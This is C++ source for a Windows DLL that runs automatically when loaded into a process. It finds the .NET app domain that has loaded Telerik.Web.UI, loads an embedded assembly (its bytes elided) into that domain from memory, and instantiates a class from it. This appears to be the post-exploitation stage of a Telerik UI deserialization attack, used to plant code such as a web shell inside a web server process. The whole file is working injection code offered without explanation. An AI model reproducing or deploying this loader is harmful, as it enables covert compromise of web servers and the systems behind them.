#include <mscoree.h>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")
#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;

#define ASSEMBLY_LENGTH 8192


unsigned char rawData[8192] = {
	//...
};




ICorRuntimeHost *GetClrRuntimeHost()
{
	ICLRMetaHost *metaHost = NULL;
	ICLRRuntimeInfo *runtimeInfo = NULL;
	ICorRuntimeHost *runtimeHost = NULL;
	
	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
	metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
	runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&runtimeHost);
	//runtimeHost->Start();
	metaHost->Release();
	runtimeInfo->Release();
	
	return runtimeHost;
}

HRESULT Get_assemblies(_AppDomainPtr appDomain,const wchar_t* name) {
    	SAFEARRAY* sa_assemblies;
        appDomain->GetAssemblies(&sa_assemblies);

        LONG lower_bound, upper_bound;  

    	SafeArrayGetLBound(sa_assemblies, 1, &lower_bound);
    	SafeArrayGetUBound(sa_assemblies, 1, &upper_bound);

        for (LONG i = lower_bound; i <= upper_bound; i++) {
                _AssemblyPtr curr_assembly;
                SafeArrayGetElement(sa_assemblies, &i, &curr_assembly);

                BSTR bstr_name;
                curr_assembly->get_ToString(&bstr_name);
		
                if (wcsncmp(bstr_name, name, wcslen(name)) == 0)
                {
                        return S_OK;
                }
                SysFreeString(bstr_name);
        }
	
}


static DWORD WINAPI launcher(void* h)
{
	HRESULT hr;
	IUnknown* domain;
	HDOMAINENUM hEnum = NULL;
	const wchar_t* name = L"Telerik.Web.UI";
	ICorRuntimeHost *runtimeHost = GetClrRuntimeHost();
	if (runtimeHost != NULL)
	{
		hr = runtimeHost->EnumDomains(&hEnum);
		if (hr == S_OK)
		{
			hr = runtimeHost->NextDomain(hEnum, &domain);
			while (hr == S_OK)
			{
				mscorlib::_AppDomain* appDomain = nullptr;
				hr = domain->QueryInterface(__uuidof(mscorlib::_AppDomain), (VOID**)&appDomain);
				if (hr == S_OK)
				{
					hr = Get_assemblies(appDomain, name);
					if (hr == S_OK)
					{
						void* pvData = NULL;
						VARIANT retVal;
						_AssemblyPtr pAssembly = NULL;
	
						SAFEARRAYBOUND rgsabound[1];
						rgsabound[0].cElements = ASSEMBLY_LENGTH;
						rgsabound[0].lLbound   = 0;
						SAFEARRAY* pSafeArray  = SafeArrayCreate(VT_UI1, 1, rgsabound);
						SafeArrayAccessData(pSafeArray, &pvData);
						memcpy(pvData, rawData, ASSEMBLY_LENGTH);
						SafeArrayUnaccessData(pSafeArray);
	
						appDomain->Load_3(pSafeArray, &pAssembly);
	
						pAssembly->CreateInstance(bstr_t("G"), &retVal);
	
					}
				}
				hr = runtimeHost->NextDomain(hEnum, &domain);
	
			}

			runtimeHost->CloseEnum(hEnum);
			runtimeHost->Release();
		}
	
	}

	return 0;
};

extern "C" BOOL APIENTRY DllMain(HMODULE hinstDLL, DWORD fwdReason, void* lpvReserved)
{
	if (fwdReason == DLL_PROCESS_ATTACH)
	{
		CreateThread(0, 0, launcher, hinstDLL, 0, 0);
	}
	return TRUE;
}
